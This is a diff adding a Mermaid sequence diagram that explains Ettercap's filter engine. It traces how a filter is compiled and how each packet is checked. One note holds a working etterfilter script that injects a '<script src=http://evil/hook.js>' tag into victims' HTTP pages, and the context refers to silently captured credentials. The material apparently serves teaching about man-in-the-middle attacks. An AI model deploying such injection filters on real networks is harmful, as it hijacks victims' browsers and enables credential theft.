@@ -318,3 +318,59 @@ sequenceDiagram
 
     Note right of ET: Victim is logged in normally\nbut Attacker captured\nall credentials silently
 ```
+```mermaid
+sequenceDiagram
+    participant User
+    participant ET as Ettercap
+    participant EF as etterfilter Compiler
+    participant FE as Filter Engine
+    participant PKT as Packet Stream
+    participant V as Victim
+
+    Note over User,V: ETTERCAP FILTER ENGINE DEEP DIVE
+
+    User->>EF: Write filter script inject.ef source
+
+    Note right of User: Filter source code\nif ip.proto == TCP {\n  if tcp.dst == 80 {\n    if search(DATA.data,"</body>") {\n      replace("</body>",\n"<script src=http://evil/hook.js></script></body>")\n      msg("Injected JS into page\n")\n    }\n  }\n}
+
+    EF->>EF: Tokenize filter source
+    EF->>EF: Parse grammar and validate
+    EF->>EF: Generate bytecode instructions
+    EF->>EF: Write compiled binary inject.efc
+    EF-->>User: Filter compiled successfully
+
+    User->>ET: ettercap --filter inject.efc
+
+    ET->>FE: Load compiled filter bytecode
+    FE->>FE: Initialize virtual machine
+    FE-->>ET: Filter engine ready
+
+    Note over FE,V: RUNTIME FILTER EXECUTION
+
+    loop For Every Intercepted Packet
+        PKT->>FE: Raw packet from capture engine
+
+        FE->>FE: Check ip.proto == TCP
+        alt Not TCP
+            FE->>PKT: Pass packet unmodified
+        else Is TCP
+            FE->>FE: Check tcp.dst == 80
+            alt Not Port 80
+                FE->>PKT: Pass packet unmodified
+            else Port 80 HTTP
+                FE->>FE: search DATA.data for closing body tag
+                alt String Not Found
+                    FE->>PKT: Pass packet unmodified
+                else String Found
+                    FE->>FE: replace body tag with injected script
+                    FE->>FE: Recalculate TCP checksum
+                    FE->>FE: Recalculate IP checksum
+                    FE->>FE: Adjust packet length fields
+                    FE-->>User: msg Injected JS into page
+                    FE->>V: Forward modified packet with injected code
+                    Note right of FE: Victim browser receives\nHTML with malicious\nJavaScript injected
+                end
+            end
+        end
+    end
+```
